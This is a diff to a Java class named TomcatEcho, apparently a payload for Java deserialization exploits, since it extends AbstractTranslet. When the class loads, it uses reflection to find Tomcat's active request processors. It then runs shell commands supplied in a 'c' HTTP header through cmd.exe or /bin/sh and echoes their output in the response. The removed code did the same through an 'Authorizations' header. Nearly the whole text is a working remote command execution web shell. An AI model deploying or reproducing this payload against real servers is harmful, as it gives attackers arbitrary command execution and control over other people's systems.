@@ -9,83 +9,66 @@ import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
 import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
 import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
 
-import java.io.InputStream;
-import java.io.Writer;
-import java.lang.reflect.Field;
-import java.util.List;
-
 public class TomcatEcho extends AbstractTranslet {
 
-    static {
-        try {
-            boolean flag = false;
-            Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(),"threads");
-            for (int i=0;i<threads.length;i++){
-                Thread thread = threads[i];
-                if (thread != null){
-                    String threadName = thread.getName();
-                    if (!threadName.contains("exec") && threadName.contains("http")){
-                        Object target = getField(thread,"target");
-                        Object global = null;
-                        if (target instanceof Runnable){
-                            // 需要遍历其中的 this$0/handler/global
-                            // 需要进行异常捕获，因为存在找不到的情况
-                            try {
-                                global = getField(getField(getField(target,"this$0"),"handler"),"global");
-                            } catch (NoSuchFieldException fieldException){
-                                fieldException.printStackTrace();
+    public TomcatEcho() throws Exception {
+        boolean flag = false;
+        Thread[] threads = (Thread[])getFV(Thread.currentThread().getThreadGroup(), "threads");
+
+        for(int i = 0; i < threads.length; ++i) {
+            Thread thread = threads[i];
+            if (thread != null) {
+                String name = thread.getName();
+                if (!name.contains("exec") && name.contains("http")) {
+                    Object runnable = getFV(thread, "target");
+                    if (runnable instanceof Runnable) {
+                        try {
+                            runnable = getFV(getFV(getFV(runnable, "this$0"), "handler"), "global");
+                        } catch (Exception flag3) {
+                            continue;
+                        }
+
+                        java.util.List processors = (java.util.List)getFV(runnable, "processors");
+                        for(int j = 0; j < processors.size(); ++j) {
+                            Object flag0 = processors.get(j);
+                            Object request = getFV(flag0, "req");
+                            Object response = request.getClass().getMethod("getResponse",new Class[0]).invoke(request,new Object[0]);
+                            String cmd;
+                            cmd = (String)request.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(request, new Object[]{new String("techo")});
+                            if (cmd != null && !cmd.isEmpty()) {
+                                response.getClass().getMethod("setStatus", new Class[]{Integer.TYPE}).invoke(response, new Object[]{new Integer(200)});
+                                response.getClass().getMethod("addHeader", new Class[]{String.class, String.class}).invoke(response, new Object[]{new String("techo"), cmd});
+                                flag = true;
+                            }
+                            cmd = (String)request.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(request, new Object[]{new String("c")});
+                            if (cmd != null && !cmd.isEmpty()) {
+                                response.getClass().getMethod("setStatus", new Class[]{Integer.TYPE}).invoke(response, new Object[]{new Integer(200)});
+                                String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};
+                                writeBody(response, (new java.util.Scanner((new ProcessBuilder(cmds)).start().getInputStream())).useDelimiter("\\A").next().getBytes());
+                                flag = true;
+                            }
+
+                            if (flag) {
+                                break;
                             }
                         }
-                        // 如果成功找到了 我们的 global ，我们就从里面获取我们的 processors
-                        if (global != null){
-                            List processors = (List) getField(global,"processors");
-                            for (i=0;i<processors.size();i++){
-                                org.apache.coyote.RequestInfo requestInfo = (org.apache.coyote.RequestInfo) processors.get(i);
-                                if (requestInfo != null){
-                                    org.apache.coyote.Request tempRequest = (org.apache.coyote.Request) getField(requestInfo,"req");
-                                    org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) tempRequest.getNote(1);
-                                    org.apache.catalina.connector.Response response = request.getResponse();
-                                    String cmd = request.getHeader("Authorizations") != null?request.getHeader("Authorizations"):null;
-                                    if (cmd != null){
-                                        System.out.println(cmd);
-                                        InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
-                                        StringBuilder sb = new StringBuilder("");
-                                        byte[] bytes = new byte[1024];
-                                        int n = 0 ;
-                                        while ((n=inputStream.read(bytes)) != -1){
-                                            sb.append(new String(bytes,0,n));
-                                        }
-                                        Writer writer = response.getWriter();
-                                        writer.write(sb.toString());
-                                        writer.flush();
-                                        inputStream.close();
-                                        flag = true;
-                                    }
-                                    if (flag){
-                                        break;
-                                    }
-                                }
-                            }
+
+                        if (flag) {
+                            break;
                         }
                     }
                 }
-                if (flag){
-                    break;
-                }
             }
-        } catch (Exception e){
-            e.printStackTrace();
         }
 
     }
 
 
-    public static Object getField(Object obj,String fieldName) throws Exception{
-        Field f0 = null;
+    public static Object getFV(Object obj,String fieldName) throws Exception{
+        java.lang.reflect.Field f0 = null;
         Class clas = obj.getClass();
-
         while (clas != Object.class){
-            try {
+            try{
                 f0 = clas.getDeclaredField(fieldName);
                 break;
             } catch (NoSuchFieldException e){
@@ -99,6 +82,26 @@ public class TomcatEcho extends AbstractTranslet {
         }else {
             throw new NoSuchFieldException(fieldName);
         }
+    }
+
+    private static void writeBody(Object response, byte[] result) throws Exception {
+        Object byteChunk;
+        Class clazz;
+        try {
+            clazz = Class.forName("org.apache.tomcat.util.buf.ByteChunk");
+            byteChunk = clazz.newInstance();
+            clazz.getDeclaredMethod("setBytes", new Class[]{byte[].class, Integer.TYPE, Integer.TYPE}).invoke(byteChunk, new Object[]{result, new Integer(0), new Integer(result.length)});
+            response.getClass().getMethod("doWrite", new Class[]{clazz}).invoke(response, new Object[]{byteChunk});
+        } catch (ClassNotFoundException e1) {
+            clazz = Class.forName("java.nio.ByteBuffer");
+            byteChunk = clazz.getDeclaredMethod("wrap", new Class[]{byte[].class}).invoke(clazz, new Object[]{result});
+            response.getClass().getMethod("doWrite", new Class[]{clazz}).invoke(response, new Object[]{byteChunk});
+        } catch (NoSuchMethodException e2) {
+            clazz = Class.forName("java.nio.ByteBuffer");
+            byteChunk = clazz.getDeclaredMethod("wrap", new Class[]{byte[].class}).invoke(clazz, new Object[]{result});
+            response.getClass().getMethod("doWrite", new Class[]{clazz}).invoke(response, new Object[]{byteChunk});
+        }
+
     }
 
     @Override
